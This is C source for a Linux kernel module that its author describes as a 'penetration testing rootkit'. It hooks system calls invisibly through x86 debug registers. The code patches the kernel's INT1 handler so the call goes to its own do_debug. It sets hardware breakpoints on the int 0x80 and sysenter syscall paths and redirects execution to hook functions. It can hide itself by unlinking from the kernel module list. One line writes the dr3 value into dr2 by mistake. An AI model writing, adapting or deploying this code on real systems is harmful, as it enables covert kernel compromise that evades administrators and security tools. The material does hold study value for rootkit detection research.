/* 
    A simple DR based Linux kernel hooking engine

    Miami Beach
    08/12/2008
*/

#define __DEBUG__
#include "DR.h"

/* hooks live here */
#include "hooktable.h"


unsigned int sys_table_global = 0;
void *hook_table[NR_syscalls];


static void __set_watch(struct watch *watches)
{
    if (watches->dr0)
        __asm__ __volatile__ (  "movl %0,%%dr0   \n\t" 
                                : 
                                : "r" (watches->dr0)    );

    if (watches->dr1)
        __asm__ __volatile__ (  "movl %0,%%dr1   \n\t"
                                :
                                : "r" (watches->dr1)    );

    if (watches->dr2)
        __asm__ __volatile__ (  "movl %0,%%dr2   \n\t"
                                :
                                : "r" (watches->dr2)    );

    if (watches->dr3)
        __asm__ __volatile__ (  "movl %0,%%dr2   \n\t"
                                :
                                : "r" (watches->dr3)    );

    /* set status */
    if (watches->stat)
        __asm__ __volatile__ (  "movl %0,%%dr6   \n\t"
                                :
                                : "r" (watches->stat)   );

    /* set ctrl */
    if (watches->ctrl)
        __asm__ __volatile__ (  "movl %0,%%dr7  \n\t"
                                :
                                : "r" (watches->ctrl)   );
        
}

/*
    The patched do_debug handler
    
    original lives at: ./arch/i386/kernel/traps.c:do_debug

    NOTE:

    This is where we would handle access to the debug regs
    for full stealth .. considering this is intended as a
    penetration testing rootkit .. I've not included this.

entry.S - 2.6:

KPROBE_ENTRY(debug)
        RING0_INT_FRAME
        cmpl $sysenter_entry,(%esp)     <- find sysenter_entry here too!
        jne debug_stack_correct
        FIX_STACK(12, debug_stack_correct, debug_esp_fix_insn)
debug_stack_correct:
        pushl $-1                       # mark this as an int
        CFI_ADJUST_CFA_OFFSET 4
        SAVE_ALL
        xorl %edx,%edx                  # error code 0
        movl %esp,%eax                  # pt_regs pointer
        call do_debug                   <- PATCH ME!
        jmp ret_from_exception
        CFI_ENDPROC
KPROBE_END(debug)


*/

/*
    __get_do_debug_2_6(int handler)

    in:     address of INT1 handler
    out:    original do_debug address

    Finds the 'call do_debug' and patches the offset
    to point to our patched handler.
*/

static int __get_and_set_do_debug_2_6(unsigned int handler, unsigned int my_do_debug)
{
    unsigned char *p        = (unsigned char *)handler;
    unsigned char buf[4]    = "\x00\x00\x00\x00";
    unsigned int offset     = 0;
    unsigned int orig       = 0;

    /* find a candidate for the call .. needs better heuristics */
    while (p[0] != 0xe8)
    {
        p ++;
    }
    DEBUGLOG(("*** found call do_debug %X\n", (unsigned int)p));
    buf[0]  = p[1];
    buf[1]  = p[2];
    buf[2]  = p[3];
    buf[3]  = p[4];

    offset  = *(unsigned int *)buf; 
    DEBUGLOG(("*** found call do_debug offset %X\n", offset));
    
    orig    = offset + (unsigned int)p + 5;
    DEBUGLOG(("*** original do_debug %X\n", orig));

    offset  = my_do_debug - (unsigned int)p - 5;
    DEBUGLOG(("*** want call do_debug offset %X\n", offset));

    p[1]    = (offset & 0x000000ff);
    p[2]    = (offset & 0x0000ff00) >>  8;
    p[3]    = (offset & 0x00ff0000) >> 16;
    p[4]    = (offset & 0xff000000) >> 24;
    DEBUGLOG(("*** patched in new do_debug offset\n"));

    return orig;
}

void (*__orig_do_debug)(struct pt_regs * regs, unsigned long error_code)
;

/* regs in eax, error_code in edx .. static reg optimized is fine */
static void __my_do_debug(struct pt_regs * regs, 
                unsigned long error_code)
{
    struct task_struct *tsk = current;
    siginfo_t info;

    int trap            = -1;
    int control         = 0;
    int s_control       = 0;
    int status          = 0;
    unsigned int dr2    = 0;
    void **sys_p        = (void **)sys_table_global;

    /* get dr6 */
    __asm__ __volatile__ (  "movl %%dr6,%0   \n\t"
                            : "=r" (status)  );

    /* enable irqs ? if (regs->eflags & X86_EFLAGS_IF) */

    /* check for trap on dr0 */
    if (status & DR_TRAP0)
    {
        trap = 0;
        status &= ~DR_TRAP0;
    }

    /* check for trap on dr1 */
    if (status & DR_TRAP1)
    {
        trap = 1;
        status &= ~DR_TRAP1;
    }

    /* check for trap on dr2 */
    if (status & DR_TRAP2)
    {
        trap = 2;
        status &= ~DR_TRAP2;
    }

    /* check for trap on dr3 */
    if (status & DR_TRAP3)
    {
        trap = 3;
        status &= ~DR_TRAP3;
    }

    /* we keep re-setting our control register after operation */
    
    /* DR0 is our int0x80 handler watch */
    control |= TRAP_GLOBAL_DR0;
    control |= DR_RW_EXECUTE << DR0_RW;
    control |= 0             << DR0_LEN;

#ifdef __SYSENTER_ENABLE__

    /* DR1 is our sysenter handler watch */
    control |= TRAP_GLOBAL_DR1;
    control |= DR_RW_EXECUTE << DR1_RW;
    control |= 0             << DR1_LEN;

#endif

    /* dr0-dr3 handlers */

    switch (trap)
    {
        /* dr0 handles int 0x80, dr1 handles sysenter */
        case 0:
        case 1:

            /* if we dont have a hook for this call do nothing */
            if (!hook_table[regs->eax])
            {
                __asm__ __volatile__ (  "movl %0,%%dr6  \n\t"
                                        "movl %1,%%dr7  \n\t"
                                        :
                                        : "r" (status), "r" (control)   );
                break;
            }

            /* DR2 2nd watch on the syscall_table entry for this syscall */
            dr2 = sys_table_global + (unsigned int)regs->eax * sizeof(void *);
            /* enable exact breakpoint detection LE/GE */
            s_control   |= TRAP_GLOBAL_DR2;
            s_control   |= TRAP_LE;
            s_control   |= TRAP_GE;
            s_control   |= DR_RW_READ << DR2_RW;
            s_control   |= 3          << DR2_LEN;

            DEBUGLOG(("*** dr0/dr1 trap: setting read watch on syscall_NR of %d at %X\n", \
                    (unsigned int)regs->eax, dr2));

            /* set dr2 read watch on syscall_table */
            __asm__ __volatile__ (  "movl %0,%%dr2  \n\t"
                                    :
                                    : "r" (dr2) );
            
            /* set new control .. gives up syscall handler to avoid races */
            __asm__ __volatile__ (  "movl %0,%%dr6  \n\t"
                                    "movl %1,%%dr7  \n\t"
                                    :
                                    : "r" (status), "r" (s_control)   );

            /* if vm86 mode .. pass it on to orig */
            if (regs->eflags & VM_MASK)
                goto orig_do_debug;

            break;

        /* handle the watch on syscall_table .. return patched address */ 
        case 2:
            DEBUGLOG(("*** got dr2 trap (syscall_table watch)\n"));

            /* clear dr2 watch */
            __asm__ __volatile__ (  "xorl %eax,%eax \n\t"   
                                    "movl %eax,%dr2 \n\t"   );

            /* restore old int0x80 handler control */
            __asm__ __volatile__ (  "movl %0,%%dr6  \n\t"
                                    "movl %1,%%dr7  \n\t"
                                    :
                                    : "r" (status), "r" (control)   );

            /*
                At the time of the trap1 eip is pointing at syscall
                so .. we just set the eip for the task to hook :P

                NOTE:

                eax has our syscall number for both sysenter/int0x80
            */

            if ((regs->eax >= 0 && regs->eax < NR_syscalls) && hook_table[regs->eax])
            {
                /* double check .. verify eip matches original */
                unsigned int verify_hook = (unsigned int)sys_p[regs->eax];
                if (regs->eip == verify_hook)
                {
                    regs->eip = (unsigned int)hook_table[regs->eax];
                    DEBUGLOG(("*** hooked __NR_%d at %X to %X\n", regs->eax, verify_hook, \
                                (unsigned int)hook_table[regs->eax]));
                }
            }

            if (regs->eflags & VM_MASK)
                goto orig_do_debug;

            break;

        case 3:
            DEBUGLOG(("*** got dr3 trap\n"));
            __asm__ __volatile__ (  "movl %0,%%dr6  \n\t"
                                    "movl %1,%%dr7  \n\t"
                                    :
                                    : "r" (status), "r" (control)   );
            break;

        default:
            DEBUGLOG(("*** unhandled trap"));

        orig_do_debug:

            /* call through to original int 1 handler */
            (*__orig_do_debug)(regs, error_code);

            /* restore our control just in case */
            __asm__ __volatile__ (  "movl %0,%%dr7  \n\t"
                                    :
                                    : "r" (control) );
    }

    /* set the resume flag after trap .. clear trap flag */
    if (trap >= 0)
    {
        regs->eflags |= X86_EFLAGS_RF;
        regs->eflags &= ~X86_EFLAGS_TF;
    }
}

unsigned int h0x01_global    = 0;

void exit_DR(void)
{
    struct watch watches = { 0, 0, 0, 0, 0, 0 };

    DEBUGLOG(("******* UNLOADING IA32 DR HOOKING ENGINE *******\n"));

    /* clear any breakpoints on all cpu's */
    on_each_cpu(__set_watch, &watches, 0, 0);
  
    __get_and_set_do_debug_2_6(h0x01_global, (unsigned int)__orig_do_debug); 
  
    //__uninit_hook_table();

    return;
}

/*
    This should:

    1) kalloc a page for the handler/hooks
    2) install the handler/hooks
    3) return without loading

    NOTE:
    Right now it just uses a module load logic for development
    debugging simplification.

*/

int init_DR(void)
{
    unsigned int h0x80          = 0;
    unsigned int h0x01          = 0;
    unsigned int table          = 0;
    unsigned int syscall_call   = 0;
    unsigned int sysenter_entry = 0;
    struct watch watches        = { 0, 0, 0, 0, 0, 0 };

    DEBUGLOG(("******* LOADING IA32 DR HOOKING ENGINE *******\n"));

    h0x80 = __get_int_handler(0x80);
    DEBUGLOG(("*** loader: handler for INT 128: %X\n", h0x80));
    
    table               = __get_syscall_table(h0x80, RETURN_SYSCALL_TABLE);
    syscall_call        = __get_syscall_table(h0x80, RETURN_SYSCALL_CALL);
    sys_table_global    = table;
    store_syscall_table(table);

    DEBUGLOG(("*** loader: syscall_table: %X\n", table));
    DEBUGLOG(("*** loader: syscall_call call *table(,eax,4): %X\n", syscall_call));
    
    h0x01 = __get_int_handler(0x1);
    DEBUGLOG(("*** loader: handler for INT 1: %X\n", h0x01));
    
    /* XXX: only for debug cleanup on unload */
    h0x01_global    = h0x01;

    /* patch the do_debug call offset in the INT 1 handler */
    __orig_do_debug = (void (*)())__get_and_set_do_debug_2_6(h0x01, \
                                (unsigned int)__my_do_debug);
    DEBUGLOG(("*** loader: INT 1 handler patched to use __my_do_debug\n"));
   
    //module entry point should now initialize hook_table and DR
    // __init_hook_table(); 
    //DEBUGLOG(("*** loader: initialized hook_table\n"));

    /*
        Set a breakpoint on sycall handler in dr0 for 1 byte
    */

    /* for DR_RW_EXECUTE len has to be 0 (1 byte) (IA32_SDM_3B.pdf) */
    
    /* syscall_call watch into dr0 */
    watches.ctrl    |= TRAP_GLOBAL_DR0;
    watches.ctrl    |= DR_RW_EXECUTE << DR0_RW; 
    watches.ctrl    |= 0             << DR0_LEN;
    watches.dr0     = syscall_call;

#ifdef __SYSENTER_ENABLE__

    /* we can find the 2nd addie by searching backwards for call *table(,%eax,4) ! :) */
    sysenter_entry = __get_sysenter_entry(syscall_call, table);
    DEBUGLOG(("*** loader: systenter_entry call *table(,eax,4): %X\n", sysenter_entry));

    /* if we were able to find the sysentry_entry syscall_table call .. hooray */
    if (sysenter_entry)
    {
        /* sysenter_entry watch into dr1 */
        watches.ctrl    |= TRAP_GLOBAL_DR1;
        watches.ctrl    |= DR_RW_EXECUTE << DR1_RW;
        watches.ctrl    |= 0             << DR1_LEN;
        watches.dr1     = sysenter_entry;
    }
    
#endif

    /* support smp */
    on_each_cpu(__set_watch, &watches, 0, 0);

#ifdef __UNLINK_LKM__

    list_del(&THIS_MODULE->list);

#endif

    /* when we switch to kmalloc .. return -EINVAL */
    return 0; //-EINVAL;
}


